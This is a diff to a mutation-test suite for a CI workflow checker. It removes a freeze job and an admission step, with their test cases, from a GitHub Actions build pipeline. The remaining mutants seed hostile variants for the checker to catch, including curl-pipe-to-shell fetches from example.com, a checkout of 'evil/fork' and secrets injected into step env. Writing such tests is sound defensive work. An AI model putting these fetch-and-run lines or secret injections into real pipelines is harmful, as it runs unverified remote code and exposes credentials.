@@ -31,8 +31,6 @@
 # The stage passes --version = the tag minus the leading v (0.3.0, or 0.3.0-rc.1); the apk of a variant is
 # found by bin/build-version-check.py
 # and `items-apk`, so the stage names no apk file.
-# bin/build-admit.py gets GH_TOKEN only through the apk job's Witness step env; the script runs `unset
-# GH_TOKEN` right after the admission line.
 # bin/witnessed-local.sh holds all the Witness flags and runs the command as plain bash SCRIPT ARGS; the judge is witness_seam, helper and
 # directwitness in
 # bin/chain-test-shape.py and the fixture side is witness_block and witnessed_text below.
@@ -95,7 +93,6 @@ json.dump({"actions": [CHECKOUT, UPLOAD, DOWNLOAD]}, open(w + "/allowed-actions.
 
 
 def witness_block(spec_):       # the stage's Witness step(s): one line through the helper (the fixture side of the seam, 1/2)
-    env = "        env:\n          GH_TOKEN: ${{ github.token }}\n" if spec_["gh"] else ""
     one = {"build": "apk", "rebuild": "rapk", "snapshot-build": "snapshot-apk", "snapshot-rebuild": "snapshot-rapk"}
 
     def line(step, kind):       # the two assemble jobs run the one script with its STEP word
@@ -103,8 +100,8 @@ def witness_block(spec_):       # the stage's Witness step(s): one line through 
         return "bash bin/witnessed-local.sh %s bin/build-stage-%s.sh" % (step, kind)
     run = line(spec_["step"], spec_["kind"])
     if not spec_.get("mode"):
-        return "      - name: %s under Witness\n%s        run: %s\n" % (spec_["step"], env, run)
-    out = "      - name: %s under Witness\n        if: %s\n%s        run: %s\n" % (spec_["step"], S.MODE_RELEASE_IF, env, run)
+        return "      - name: %s under Witness\n        run: %s\n" % (spec_["step"], run)
+    out = "      - name: %s under Witness\n        if: %s\n        run: %s\n" % (spec_["step"], S.MODE_RELEASE_IF, run)
     snap = line(S.SNAPSHOT_STEP[spec_["step"]], "snapshot-" + spec_["kind"])
     return out + "      - name: %s under Witness\n        if: %s\n        run: %s\n" % (S.SNAPSHOT_STEP[spec_["step"]], S.MODE_SNAPSHOT_IF, snap)
 
@@ -134,19 +131,8 @@ def stage_text(family):
     for job in S.FAMILY_JOBS[family]:
         sp = S.JOBS[(family, job)]
         out += "  %s:\n" % job
-        if sp["kind"] == "freeze":      # rule 1: the freeze check in a job of its own (no Witness, no tools); gate G is its if
-            out += "    if: %s\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    steps:\n" % S.BUILD_GATE
-            out += "      - uses: %s # v7.0.1\n        with:\n" % CHECKOUT
-            out += "          persist-credentials: false\n          fetch-depth: 0\n"
-            IF = "        if: %s\n" % S.MODE_RELEASE_IF
-            out += "      - name: the mode is release or snapshot\n        env:\n          MODE: %s\n" % S.MODE_GUARD_ENV["MODE"]
-            out += "        run: %s\n" % S.MODE_GUARD_RUN
-            out += "      - name: install Go (pinned by checksum)\n%s        run: %s\n" % (IF, S.INSTALL_GO)
-            out += "      - name: the freeze check of every baseline file\n%s        run: %s\n" % (IF, S.FREEZE_RUN)
-            out += "      - uses: %s # v7.0.1\n%s        with:\n" % (UPLOAD, IF)
-            out += "          name: freeze\n          path: freeze\n"
-            continue
-        out += "    needs: %s\n" % sp["needs"]
+        if sp.get("gate"): out += "    if: %s\n" % S.BUILD_GATE
+        if sp.get("needs"): out += "    needs: %s\n" % sp["needs"]
         out += ("    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04, ubuntu-24.04-arm]\n" if sp["matrix"] else "    runs-on: ubuntu-24.04\n")
         out += "    permissions:\n" + "".join("      %s: %s\n" % kv for kv in sp["perm"].items())
         if sp.get("expose"): out += "    outputs:\n      digests: %s\n" % S.JOB_OUTPUT
@@ -164,8 +150,7 @@ def stage_text(family):
         out += "      - name: pull the archive by its committed digest\n        run: %s\n" % S.ARCHIVE_PULL
         if sp.get("hosttools"): out += "      - name: unpack the host tools from the archive (bubblewrap for melange's runner)\n        run: %s\n" % S.INSTALL_HOSTTOOLS
         for name, path in sp["down"]:
-            ifl = "        if: %s\n" % S.MODE_RELEASE_IF if name == "freeze" else ""
-            out += "      - uses: %s # v5.0.0\n%s        with:\n" % (DOWNLOAD, ifl)
+            out += "      - uses: %s # v5.0.0\n        with:\n" % DOWNLOAD
             out += "          name: %s\n          path: %s\n" % (name, path)
         for name, path in sp.get("down_records", ()):
             out += "      - uses: %s # v5.0.0\n        if: %s\n        with:\n          name: %s\n          path: %s\n" % (DOWNLOAD, S.MODE_RELEASE_IF, name, path)
@@ -183,7 +168,7 @@ def stage_text(family):
             out += "      - uses: %s # v7.0.1\n        with:\n" % UPLOAD
             out += "          name: hostile-attempts\n          path: attempts\n          if-no-files-found: error\n"
         for name, path in sp["up"]:
-            guard = "        if: always()\n" if name == S.VERDICT_ARTIFACT else ("        if: %s\n" % S.ADMISSION_IF if name == "admission" else ("        if: %s\n" % S.BASELINE_IF if name == "admission-baseline" else ("        if: %s\n" % S.MODE_RELEASE_IF if name.startswith("rebuild-records-") else "")))
+            guard = "        if: always()\n" if name == S.VERDICT_ARTIFACT else ("        if: %s\n" % S.MODE_RELEASE_IF if name.startswith("rebuild-records-") else "")
             out += "      - uses: %s # v7.0.1\n%s        with:\n          name: %s\n          path: %s\n" % (UPLOAD, guard, name, path)
     return out
 
@@ -222,12 +207,10 @@ st s_incl "AC1 an include entry in the matrix" matrix 'runner: [ubuntu-24.04, ub
        'runner: [ubuntu-24.04, ubuntu-24.04-arm]\n        include:\n          - runner: ubuntu-22.04'
 st s_asmarm "AC1 the assemble job on the arm runner" "assemble job must run directly on" "$ASM" 'needs: build-apk\n    runs-on: ubuntu-24.04-arm\n'
 st s_noneed "AC1 the assemble job does not need the apk jobs" "must need exactly build-apk" 'needs: build-apk' 'needs: []'
-st s_pkg    "AC1 packages: write" permissions '      checks: read\n' '      checks: read\n      packages: write\n'
-st s_noid   "AC1 id-token: write on a building job (the building jobs hold no identity token: owner Oct 22)" permissions '      checks: read\n' '      checks: read\n      id-token: write\n'
-st s_nochk  "AC1 the admission job without checks: read (the required-checks check could not run)" permissions '      checks: read\n' ''
-# The AC2 checkout and allow-list mutants hit the apk job (the one that holds GH_TOKEN): the anchor is the apk job's own
-# permissions tail and its checkout. The s_fz_ copies hit the freeze job, the first job of the file.
-APKCO='      pull-requests: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 '\
+st s_pkg    "AC1 packages: write" permissions '      contents: read\n' '      contents: read\n      packages: write\n'
+st s_noid   "AC1 id-token: write on a building job (the building jobs hold no identity token: owner Oct 22)" permissions '      contents: read\n' '      contents: read\n      id-token: write\n'
+# The AC2 checkout and allow-list mutants hit the apk job: the anchor is the apk job's own permissions tail and its checkout.
+APKCO='      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 '\
 '# v7.0.1\n'
 APKWITH='        with:\n          persist-credentials: false\n'
 APKUP='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n       '\
@@ -243,23 +226,6 @@ st s_repo   "AC2 apk's checkout of another repository" "build-apk: step 1" "$APK
 repository: evil/fork\n"
 st s_token  "AC2 apk's checkout with a token" "build-apk: step 1" "$APKCO$APKWITH" "$APKCO$APKWITH          token: \${{ \
 secrets.X }}\n"
-st s_fz_unpin  "AC2 the freeze job's checkout not pinned by digest" "build-freeze: step 1" \
-       'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v7'
-st s_fz_unlist "AC2 the freeze job's upload digest that is not on the allowed-actions list" "build-freeze: action" \
-       'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a' 'actions/upload-artifact@1111111111111111111111111111111111111111'
-st s_fz_cred   "AC2 the freeze job's persisted credentials" "build-freeze: step 1" 'persist-credentials: false' \
-  'persist-credentials: true'
-st s_fz_ref    "AC2 the freeze job's checkout of another ref" "build-freeze: step 1" 'persist-credentials: false' \
-       'persist-credentials: false\n          ref: main'
-st s_fz_repo   "AC2 the freeze job's checkout of another repository" "build-freeze: step 1" 'persist-credentials: false' \
-       'persist-credentials: false\n          repository: evil/fork'
-st s_fz_token  "AC2 the freeze job's checkout with a token" "build-freeze: step 1" 'persist-credentials: false' \
-       'persist-credentials: false\n          token: ${{ secrets.X }}'
-ADMUP='      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        if: ${{ inputs.mode != '"'snapshot'"' && matrix.runner == '"'ubuntu-24.04'"' }}\n        with:\n          name: admission\n          path: admission.json\n'
-st s_adm_gone "AC8 Build's admission record is not uploaded (Release could not read the baseline a patch tag used)" "admission" "$ADMUP" ''
-st s_adm_all  "AC8 admission.json uploaded from every apk leg (one fixed name from a matrix clashes)" "admission" " && matrix.runner == 'ubuntu-24.04'" ''
-st s_adm_name "AC8 admission.json uploaded under another name" "admission" 'name: admission\n' 'name: admission-record\n'
-st s_adm_snap "AC8 admission.json uploaded in a snapshot run too (no admission ran: the upload would fail)" "admission" "inputs.mode != 'snapshot' && matrix.runner" "matrix.runner"
 GOINST='      - name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n'
 WINST='      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n'
 st s_go_gone  "AC4 the Go toolchain install of the melange build is missing from Build's apk job" "install-scanner.sh \
@@ -275,68 +241,9 @@ st s_bt_early  "004-AC3 the build tools installed BEFORE Witness (rule 68: Witne
 st s_bt_other  "004-AC3 another install command in place of melange's (not the pinned installer)" "install-build-tools.sh melange" 'run: bash bin/install-build-tools.sh melange' 'run: bash bin/install-scanner.sh melange'
 st s_bt_tool   "004-AC3 a third build tool through the same installer" "download-artifact" "$APKINST" "$APKINST      - name: install helm\n        run: bash bin/install-build-tools.sh helm\n"
 st s_bt_dest   "004-AC3 the installer given another destination" "install-build-tools.sh melange" 'install-build-tools.sh melange' 'install-build-tools.sh melange /tmp/bin'
-st s_bt_env    "004-AC3 an env on the installer step (a token or secret could reach it before admission)" "install-build-tools.sh apko" "$APKINST" '      - name: install apko (pinned by checksum)\n        env:\n          K: ${{ secrets.X }}\n        run: bash bin/install-build-tools.sh apko\n'
-st s_bt_menv   "004-AC3 an env on the melange installer step (a token or secret could reach it before admission; the melange half of s_bt_env, no env, no secret)" "no env, no secret" "$MELINST" '      - name: install melange (pinned by checksum)\n        env:\n          GH_TOKEN: ${{ secrets.X }}\n        run: bash bin/install-build-tools.sh melange\n'
+st s_bt_env    "004-AC3 an env on the installer step" "install-build-tools.sh apko" "$APKINST" '      - name: install apko (pinned by checksum)\n        env:\n          K: ${{ secrets.X }}\n        run: bash bin/install-build-tools.sh apko\n'
+st s_bt_menv   "004-AC3 an env on the melange installer step (the melange half of s_bt_env, no env, no secret)" "no env, no secret" "$MELINST" '      - name: install melange (pinned by checksum)\n        env:\n          GH_TOKEN: ${{ secrets.X }}\n        run: bash bin/install-build-tools.sh melange\n'
 st s_go_first "AC4 Go installed BEFORE Witness (rule 68: Witness first)" "install-scanner.sh" "$WINST$GOINST" "$GOINST$WINST"
-# rule 1 of the sandboxed build: the freeze job's grammar (mode guard first, every other step and apk's download
-# release-only)
-# and the two places the freeze script may not appear
-RIF='if: ${{ inputs.mode != '"'snapshot'"' }}\n'
-FZGO='      - name: install Go (pinned by checksum)\n        '"$RIF"'        run: bash bin/install-scanner.sh go\n'
-FZRUN='      - name: the freeze check of every baseline file\n        '"$RIF"'        run: bash bin/build-freeze.sh\n'
-FZGUARD='      - name: the mode is release or snapshot\n        env:\n          MODE: ${{ inputs.mode || '\''release'\'' }}\n        '\
-'run: bash bin/build-stage-refuse-mode.sh "$MODE"\n'
-st s_fz_goif  "AC4 the freeze job's Go install without its release-mode if" "build-freeze: step 3" "$FZGO" "$GOINST"
-st s_fz_runif "AC4 the freeze job's script step without its release-mode if" "build-freeze: step 4" \
-       '        '"$RIF"'        run: bash bin/build-freeze.sh' '        run: bash bin/build-freeze.sh'
-st s_fz_upif  "AC4 the freeze job's upload without its release-mode if" "build-freeze: step 5" \
-       '        '"$RIF"'        with:\n          name: freeze\n          path: freeze\n  build-apk:' \
-       '        with:\n          name: freeze\n          path: freeze\n  build-apk:'
-st s_fz_guard "AC4 the freeze job has no mode guard (a mixed-case mode value could pass the ifs)" "build-freeze: " \
-  "$FZGUARD" ''
-st s_fz_gcond "AC4 the freeze job's mode guard under an if" "build-freeze: step 2" \
-       "$FZGUARD" '      - name: the mode is release or snapshot\n        '"$RIF"'        env:\n          MODE: ${{ '\
-'inputs.mode }}\n        run: bash bin/build-stage-refuse-mode.sh "$MODE"\n'
-st s_fz_dlif  "AC4 apk's download of the freeze result without its release-mode if" "name freeze" \
-       '        '"$RIF"'        with:\n          name: freeze\n          path: freeze\n      - name: apk' \
-       '        with:\n          name: freeze\n          path: freeze\n      - name: apk'
-st s_fz_apk   "AC4 bin/build-freeze.sh run by a step of the apk job (NS_SKIP leaves it unread: only the freeze job \
-may run it)" \
-       "only the build-freeze job runs bin/build-freeze.sh" "$WINST" '      - name: freeze in apk\n        run: bash '\
-'bin/build-freeze.sh\n'"$WINST"
-st s_fz_vf    "AC4 verify-freeze named by a step of the assemble job" "names verify-freeze" "$APKINST" \
-       '      - name: freeze in assemble\n        run: echo verify-freeze v0.3.0\n'"$APKINST"
-# the freeze job's own refusals (job keys, runner, permissions, env on its steps, its upload) and apk's needs
-GATE=$(python3 -I - "$shape" <<'PY'
-import importlib.util, sys
-spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
-print(S.BUILD_GATE)
-PY
-)
-FZHEAD="  build-freeze:\n    if: $GATE\n    runs-on: ubuntu-24.04\n"
-FZPERM='    permissions:\n      contents: read\n    steps:\n'
-st s_fz_needs "AC4 a needs key on the freeze job" "build-freeze: job keys" "$FZHEAD" "$FZHEAD    needs: []\n"
-st s_fz_jenv  "AC4 an env on the freeze job" "build-freeze: job keys" "$FZHEAD" "$FZHEAD    env:\n      A: b\n"
-st s_fz_cont  "AC4 a container on the freeze job" "build-freeze: job keys" "$FZHEAD" "$FZHEAD    container: debian:12\n"
-st s_fz_runs  "AC4 the freeze job on another runner" "build-freeze: the freeze job must run" "$FZHEAD" "  build-freeze:\n    if: $GATE\n    runs-on: ubuntu-22.04\n"
-st s_fz_pw    "AC4 contents: write on the freeze job" "build-freeze: permissions" "$FZHEAD$FZPERM" \
-       "$FZHEAD"'    permissions:\n      contents: write\n    steps:\n'
-st s_fz_pid   "AC4 id-token: write on the freeze job" "build-freeze: permissions" "$FZHEAD$FZPERM" \
-       "$FZHEAD"'    permissions:\n      contents: read\n      id-token: write\n    steps:\n'
-st s_fz_env3  "AC4 an env on the freeze job's Go install" "build-freeze: step 3" "$FZGO" \
-       '      - name: install Go (pinned by checksum)\n        env:\n          K: v\n        '"$RIF"'        run: '\
-'bash bin/install-scanner.sh go\n'
-st s_fz_env4  "AC4 an env on the freeze job's script step" "build-freeze: step 4" "$FZRUN" \
-       '      - name: the freeze check of every baseline file\n        env:\n          K: v\n        '"$RIF"'        '\
-'run: bash bin/build-freeze.sh\n'
-FZUP='          name: freeze\n          path: freeze\n  build-apk:'
-st s_fz_path  "AC4 the freeze upload with another path" "build-freeze: step 5" "$FZUP" '          name: freeze\n          '\
-'path: .\n  build-apk:'
-st s_fz_over  "AC4 the freeze upload with overwrite" "build-freeze: step 5" "$FZUP" \
-       '          name: freeze\n          path: freeze\n          overwrite: true\n  build-apk:'
-st s_fz_apkn  "AC4 apk without needs: freeze" "build-apk must need exactly build-freeze" 'needs: build-freeze\n    runs-on: ${{ '\
-'matrix.runner }}' \
-       'needs: []\n    runs-on: ${{ matrix.runner }}'
 # REQ-CHAIN-004-AC16 (advisor ACs 10-13 of Oct 15, owner rules 3 and 9): the archive is pulled by the committed digest, by the pinned crane, before anything builds
 CRANEINST='      - name: install crane (pinned by checksum)\n        run: bash bin/install-scanner.sh crane\n'
 PULLSTEP='      - name: pull the archive by its committed digest\n        run: bash bin/archive-pull.sh --pointer build/archive.json --out archive\n'
@@ -353,7 +260,7 @@ HTSTEP='      - name: unpack the host tools from the archive (bubblewrap for mel
 st s_ht_gone    "AC17 the host-tools step is missing from Build's apk job (melange's runner would find no bwrap)" "install-host-bwrap" "$HTSTEP" ''
 st s_ht_before  "AC17 the host tools unpacked BEFORE the archive pull (there is no archive yet)" "install-host-bwrap" "$PULLSTEP$HTSTEP" "$HTSTEP$PULLSTEP"
 st s_ht_asm     "AC17 the assemble job unpacks the host tools too (an assemble job runs apko only)" "crane" "$APKINST" "$APKINST$HTSTEP"
-st s_ht_env     "AC17 an env on the host-tools step (a token or secret could reach it before admission)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'env:\n          K: ${{ secrets.X }}\n        run: '"$HTRUN"'\n'
+st s_ht_env     "AC17 an env on the host-tools step" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'env:\n          K: ${{ secrets.X }}\n        run: '"$HTRUN"'\n'
 st s_ht_if      "AC17 an if on the host-tools step (a skipped step is a build with no sandbox)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'if: always()\n        run: '"$HTRUN"'\n'
 st s_ht_soft    "AC17 continue-on-error on the host-tools step" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'continue-on-error: true\n        run: '"$HTRUN"'\n'
 st s_ht_sudo    "AC17 the host-tools script run under sudo" "install-host-bwrap" "run: $HTRUN" "run: sudo $HTRUN"
@@ -370,7 +277,7 @@ st s_ar_out     "AC16 the pull into another directory than archive" "archive-pul
 st s_ar_ptr     "AC16 the pull reads another pointer than build/archive.json" "archive-pull.sh" "$PULLRUN" 'run: bash bin/archive-pull.sh --pointer archive.json --out archive'
 st s_ar_soft    "AC16 a pull that may fail (continue-on-error)" "archive-pull.sh" "$PULLSTEP" "$PULLSTEP        continue-on-error: true\n"
 st s_ar_ortrue  "AC16 a pull whose failure is swallowed" "archive-pull.sh" "$PULLRUN" "$PULLRUN || true"
-st s_ar_env     "AC16 an env on the pull step (a token could reach it before admission)" "archive-pull.sh" "$PULLSTEP" "$PULLSTEP        env:\n          GH_TOKEN: x\n"
+st s_ar_env     "AC16 an env on the pull step" "archive-pull.sh" "$PULLSTEP" "$PULLSTEP        env:\n          GH_TOKEN: x\n"
 st s_ar_if      "AC16 an if on the pull step (a skipped pull is a build with no archive)" "archive-pull.sh" 'name: pull the archive by its committed digest\n' 'name: pull the archive by its committed digest\n        if: always()\n'
 st s_ar_cdest   "AC16 crane installed to another directory (archive-pull.sh names /usr/local/bin/crane)" "install-scanner.sh crane" 'install-scanner.sh crane' 'install-scanner.sh crane /tmp/bin'
 st s_ar_bycrane "AC16 the archive fetched by a crane command in the stage instead of archive-pull.sh" "archive-pull.sh" "$PULLRUN" 'run: crane pull ghcr.io/fosterstack/archive:latest archive'
@@ -381,28 +288,12 @@ st s_go_act   "AC4 the setup-go action instead of the pinned installer (its byte
 st s_go_if    "AC4 the Go install carries an if" "install-scanner.sh go" 'name: install Go (pinned by checksum)\n     '\
 '   run: bash bin/install-scanner.sh go\n      - name: install melange' 'name: install Go (pinned by checksum)\n      '\
 '  if: always()\n        run: bash bin/install-scanner.sh go\n      - name: install melange'
-# Codex A r4 #1 (advisor reading of rule 51, a reading and not a reworded rule): admission is the first TRUST decision of Build. Before the step that runs
-# bin/witnessed-local.sh apk (admission is its first command) the apk job may hold ONLY the checkout, the mode guard (a non-secret input, refuses only) and the two
-# checksum-verified install lines; nothing with a token, a secret, a build command, a download, an upload or the identity token may come before it.
-st s_pre_env   "AC4 an env on an install step before admission (a token or secret could reach tagged code)" \
-  "before admission" 'name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n      - '\
-'name: install melange' 'name: install Go (pinned by checksum)\n        env:\n          GH_TOKEN: ${{ github.token '\
-'}}\n        run: bash bin/install-scanner.sh go\n      - name: install melange'
-st s_pre_sec   "AC4 a secret on a step before admission" "before admission" 'name: install Witness (pinned by checksum)\n' 'name: install Witness (pinned by checksum)\n        env:\n          K: ${{ secrets.KEY }}\n'
-st s_pre_build "AC4 a build command before admission" "before admission" "$GOINST" "$GOINST      - name: build early\n        run: bash bin/build-apk.sh --variant standard\n"
-st s_pre_up    "AC4 an upload before admission" "before admission" "$GOINST" "$GOINST      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: early\n          path: out\n"
-st s_pre_down  "AC4 a download before admission" "before admission" "$GOINST" "$GOINST      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n          name: x\n          path: x\n"
-st s_pre_tok   "AC4 a step that reads the identity token before admission" "before admission" "$GOINST" "$GOINST      - name: token\n        run: bash bin/x.sh \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\"\n"
-st s_pre_wit   "AC4 a Witness step before admission (the helper itself runs admission first, so it is the admission step, but a second early one is not)" "before admission" "$GOINST" "$GOINST      - name: early under Witness\n        run: bash bin/witnessed-local.sh apk bin/build-stage-apk.sh\n"
-st s_pre_other "AC4 any other run step before admission" "before admission" "$GOINST" "$GOINST      - name: other\n        run: bash bin/chain-hostile-step.sh\n"
-st s_shallow "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
+st s_shallow "AC2 a shallow checkout (the version script needs the tags)" "exactly" '          fetch-depth: 0\n' ''
 FXD_5='run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
 st s_install "AC2 Witness installed by an unpinned download" install 'run: bash bin/install-scanner.sh witness' \
        "$FXD_5"
 st s_mid "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' \
        '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
-st s_ghenv  "AC2 another token than github.token on the Witness step" "GH_TOKEN" 'GH_TOKEN: ${{ github.token }}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
-st s_nogh   "AC2 the admission job without GH_TOKEN (gh cannot read the checks)" "GH_TOKEN" '        env:\n          GH_TOKEN: ${{ github.token }}\n' ''
 st s_if "AC2 an if: other than the mode on the Witness step" "release Witness step" \
     '      - name: apk under Witness\n        if: ${{ inputs.mode != '"'snapshot'"' }}\n' \
        '      - name: apk under Witness\n        if: always()\n'
@@ -473,7 +364,7 @@ st s_probe_ct   "AC2 the probe step continues on error (a held wall and an open 
 st s_probe_cts  "AC2 the snapshot probe step continues on error" "probe" \
     '        run: bash bin/chain-sandbox-probe.sh snapshot' '        continue-on-error: true\n        run: bash bin/chain-sandbox-probe.sh snapshot'
 # REQ-CHAIN-004-AC12: snapshot mode. One input, mode (string, default release); a guard step refuses any other value; two Witness steps, one per mode, with
-# closed step names; no admission and no GH_TOKEN in the snapshot step.
+# closed step names; no GH_TOKEN in the snapshot step.
 GUARD_STEP='      - name: the mode is release or snapshot\n        env:\n          MODE: ${{ inputs.mode || '\''release'\'' }}\n        run: bash bin/build-stage-refuse-mode.sh "$MODE"\n'
 SNAP_IF="if: \${{ inputs.mode == 'snapshot' }}"
 SNAP_STEP="      - name: snapshot-apk under Witness\n        $SNAP_IF\n        run: bash bin/witnessed-local.sh snapshot-apk bin/build-stage-snapshot-apk.sh\n"
@@ -485,7 +376,7 @@ st s_guard_if "AC12 the mode guard carries an if (GitHub compares case-insensiti
               '          MODE: ${{ inputs.mode || '\''release'\'' }}\n        if: ${{ inputs.mode != '"'release'"' }}\n'
 st s_guard_coe "AC12 the mode guard is allowed to fail (continue-on-error)" "mode guard" '          MODE: ${{ inputs.mode || '\''release'\'' }}\n' \
               '          MODE: ${{ inputs.mode || '\''release'\'' }}\n        continue-on-error: true\n'
-st s_rel_noif  "AC12 the release Witness step has no if (it would run in a snapshot, with admission)" "release Witness step" \
+st s_rel_noif  "AC12 the release Witness step has no if (it would run in a snapshot)" "release Witness step" \
               '      - name: apk under Witness\n        if: ${{ inputs.mode != '"'snapshot'"' }}\n' '      - name: apk under Witness\n'
 st s_rel_snap  "AC12 the release Witness step runs in snapshot mode" "release Witness step" \
               'apk under Witness\n        if: ${{ inputs.mode != '"'snapshot'"' }}' 'apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}'
@@ -493,7 +384,7 @@ st s_snap_none "AC12 the snapshot Witness step is missing (a snapshot would buil
               "$SNAP_STEP" ''
 st s_snap_noif "AC12 the snapshot Witness step has no if (it would run in a release too)" "snapshot" \
               'snapshot-apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}\n' 'snapshot-apk under Witness\n'
-st s_snap_rel  "AC12 the snapshot Witness step runs the release script (admission and the tag)" "snapshot" \
+st s_snap_rel  "AC12 the snapshot Witness step runs the release script (the version and the tag)" "snapshot" \
               'snapshot-apk bin/build-stage-snapshot-apk.sh' 'snapshot-apk bin/build-stage-apk.sh'
 st s_snap_name "AC12 the snapshot Witness step uses a step name outside the closed list" "snapshot" \
               'snapshot-apk bin/build-stage-snapshot-apk.sh' 'snapshot bin/build-stage-snapshot-apk.sh'
@@ -545,16 +436,12 @@ st s_after "AC2 a third-party action after Witness" "step" \
 st s_comp   "AC2 a local composite action step" "step" '      - name: apk under Witness' '      - uses: ./.github/actions/x\n      - name: apk under Witness'
 st s_docker "AC2 a docker:// step" "step" '      - name: apk under Witness' '      - uses: docker://alpine:3\n      - name: apk under Witness'
 rb() { replace "$work/rebuild.yml" "$work/$1.yml" "$4" "$5" && expect caught "$2" "$3" stage "$work/$1.yml" rebuild "$AL"; return 0; }
-rb s_fz_rb    "AC4 bin/build-freeze.sh run by a step of a Rebuild job (Rebuild runs no go of the tagged tree)" \
-       "only the build-freeze job runs bin/build-freeze.sh" '      - name: install Witness (pinned by checksum)\n' \
-       '      - name: freeze in rebuild\n        run: bash bin/build-freeze.sh\n      - name: install Witness (pinned '\
-'by checksum)\n'
 rb r_step "005-AC1 Rebuild's assemble Witness step is named build (Build's record path)" "exactly the one line" 'witnessed-local.sh rebuild bin' \
        'witnessed-local.sh build bin'
 rb r_up   "005-AC4 Rebuild uploads anything but its verdict directory" "upload-artifact" 'name: witness-rebuild' 'name: dist'
 rb r_dl "005-AC4 Rebuild downloads Build's dist (it takes only the record and the lists)" "download-artifact" \
        "name: witness-build\n          path: witness-build" 'name: dist\n          path: witness-build'
-rb r_gh "005-AC1 a GH_TOKEN on Rebuild (only the admission job holds it)" "env" '      - name: rapk under Witness' \
+rb r_gh "005-AC1 a GH_TOKEN on Rebuild (no building job holds it)" "env" '      - name: rapk under Witness' \
        '      - name: rapk under Witness\n        env:\n          GH_TOKEN: ${{ github.token }}'
 rb r_recgone "R2 the record-digest step is gone from Rebuild's assemble job" "must be exactly id: records" '      - id: records\n        name: expose the record digests as the job output\n        if: ${{ inputs.mode != '"'"'snapshot'"'"' }}\n        run: r=$(bash bin/rebuild-records-digests.sh witness-rebuild rec-rapk/ubuntu-24.04 rec-rapk/ubuntu-24.04-arm) && echo "records=$r" >> "$GITHUB_OUTPUT"\n' ''
 rb r_recid "R2 the record-digest step has another id" "must be exactly id: records" '      - id: records' '      - id: other'
@@ -619,7 +506,7 @@ rb r_rapkrec_out "ruling 8 the apk job exposes its record digests as a job outpu
 rb r_chk_argswap "A1 the check's arguments are swapped" "rapk records are checked" '--check rec-digests/ubuntu-24.04/rebuild-records.json rec-digests/ubuntu-24.04-arm/rebuild-records.json' '--check rec-digests/ubuntu-24.04-arm/rebuild-records.json rec-digests/ubuntu-24.04/rebuild-records.json'
 rb r_chk_cat "A1 the check passes the file's text through a command substitution, not the path" "rapk records are checked" '--check rec-digests/ubuntu-24.04/rebuild-records.json rec-digests/ubuntu-24.04-arm/rebuild-records.json' '--check "$(cat rec-digests/ubuntu-24.04/rebuild-records.json)" "$(cat rec-digests/ubuntu-24.04-arm/rebuild-records.json)"'
 rb r_chk_onefile "A1 the check names one digest file only" "rapk records are checked" '--check rec-digests/ubuntu-24.04/rebuild-records.json rec-digests/ubuntu-24.04-arm/rebuild-records.json' '--check rec-digests/ubuntu-24.04/rebuild-records.json'
-rb r_perm "005-AC1 Rebuild with the admission permissions" permissions '      contents: read\n' '      contents: read\n      checks: read\n'
+rb r_perm "005-AC1 Rebuild with a checks permission" permissions '      contents: read\n' '      contents: read\n      checks: read\n'
 rb r_nomatrix "ruling 8 Rebuild's apk job runs on one runner (it is one job, a matrix over both chips)" "must run on matrix.runner" '    runs-on: ${{ matrix.runner }}' '    runs-on: ubuntu-24.04'
 rb r_dlrec_gone "A1 assemble does not download the x86 leg's digest list" "digest list of one Rebuild apk job" "      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        if: \${{ inputs.mode != 'snapshot' }}\n        with:\n          name: rebuild-records-ubuntu-24.04\n          path: rec-digests/ubuntu-24.04\n" ''
 rb r_dlrec_if "A1 assemble downloads a digest list in snapshot mode too (no such file exists there)" "digest list of one Rebuild apk job" "      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        if: \${{ inputs.mode != 'snapshot' }}\n        with:\n          name: rebuild-records-ubuntu-24.04-arm\n" "      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n          name: rebuild-records-ubuntu-24.04-arm\n"
@@ -857,7 +744,7 @@ PY
 }
 # The sweeps below try every deletion, swap, suffix and insertion; the probes name the mutations a reviewer asked about that are not one of those.
 FXD_3='L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
-probe apk              "AC3 a network fetch inside the admission step"              "$FXD_3"
+probe apk              "AC3 a network fetch in the script"              "$FXD_3"
